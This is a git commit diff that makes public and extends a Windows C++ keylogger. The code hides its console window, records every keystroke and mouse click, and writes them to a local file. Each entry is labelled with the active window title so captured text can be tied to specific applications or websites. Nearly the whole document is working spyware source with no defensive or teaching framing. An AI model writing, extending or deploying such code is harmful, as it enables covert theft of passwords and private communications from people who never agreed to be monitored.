b313f698af19adb17abd88d567078fd232929977
Thomas-Tubinas <143620957+Thomas-Tubinas@users.noreply.github.com>
2024-10-08 18:55:08 -0400

    Make keylogger.cpp public
    Added the final touches

--- keylogger.cpp
+++ keylogger.cpp
@@ -3,19 +3,47 @@
 #include <winuser.h>
 #include <fstream> 
 
+//Logging Varibles
 using namespace std;
 std::string line;
-int currentLine = 0;
+char previousWinTitle[256] = "";
+std::string currentLine = "";
 
+//Functions
 void Logging();
+int App();
 
+//Hides terminal
 int main(){
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+    App();
+    return 0;
+}
+
+//Gets name of application
+int App(){
+    ofstream log;
+    log.open("keys.txt", ios::app);
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd == nullptr) {
+        log << "No active window found.\n";
+        return 1;
+    }
+
+    //Prints name in log and checks to make sure they are on different website
+    char windowTitle[256];
+    GetWindowText(hwnd, windowTitle, sizeof(windowTitle));
+    if(strcmp(previousWinTitle, windowTitle) != 0){
+        log << "Currently active application: " << windowTitle << std::endl << "\n";
+    }
+    strcpy(previousWinTitle, windowTitle);
     Logging();
+    return 0;
 }
 
 //Way to organize
 void Logging(){
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     char c;
     bool caps = false;
     while (true)
@@ -26,51 +54,69 @@ void Logging(){
                 ofstream log;
                 log.open("keys.txt", ios::app);
                 switch (c) {
-                    case VK_BACK:
-                        log << "[backspace]";//delete characters by getting the current line and the last character entered
-                        break;
+                    //Backspace
+                    case VK_BACK: 
+                        if(!currentLine.empty())
+                            {
+                                currentLine.pop_back();
+                                break;
+                            } else {
+                                currentLine += "[backspace]";
+                                break;
+                            }
+                    break;
+                    //Enter
                     case VK_RETURN:
-                        currentLine++;
-                        log << "\n";//go to next line
+                        log << currentLine << endl; //go to next line
+                        currentLine = "";
+                        App();
                         break;
+                    //Shift
                     case VK_SHIFT:
                         if ((GetKeyState(VK_SHIFT) & 0x0001)!=0){
                             caps = true;
-                            log << "[Shift Up]";
+                            currentLine += "[Shift Up]";
                         } else {
                             caps = false;
-                            log << "[Shift Down]";
+                            currentLine += "[Shift Down]";
                         }
                         break;
+                    //Control
                     case VK_CONTROL:
-                        log << "[control]";
+                        currentLine += "[control]";
                         break;
+                    //Cap Lock
                     case VK_CAPITAL:
                         if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
                             caps = true;
-                            log << "[caps on]";
+                            currentLine += "[caps on]";
                         } else {
                             caps = false;
-                            log << "[caps off]";
+                            currentLine += "[caps off]";
                         }
                         break;
+                    //Tab
                     case VK_TAB:
-                        log << "[tab]";
+                        currentLine += "[tab]";
                         break;
                     case VK_MENU:
-                        log << "[alt]";
+                        currentLine += "[alt]";
+                    //Left Mouse Click
                     case VK_LBUTTON:
-                        log << "[lc]\n";
+                        currentLine += "[lc]\n";
+                        App();
                         break;
+                    //Right Mouse Click
                     case VK_RBUTTON:
-                        log << "[rc]\n";
+                        currentLine += "[rc]\n";
+                        App();
                         break;
                     default:
                         if(!caps){
                             char lc = tolower(c);
-                            log << lc;
+                            currentLine += lc;
                         } else {
-                            log << c;
+                            currentLine += c;
                         }
                 }
                 log.close();
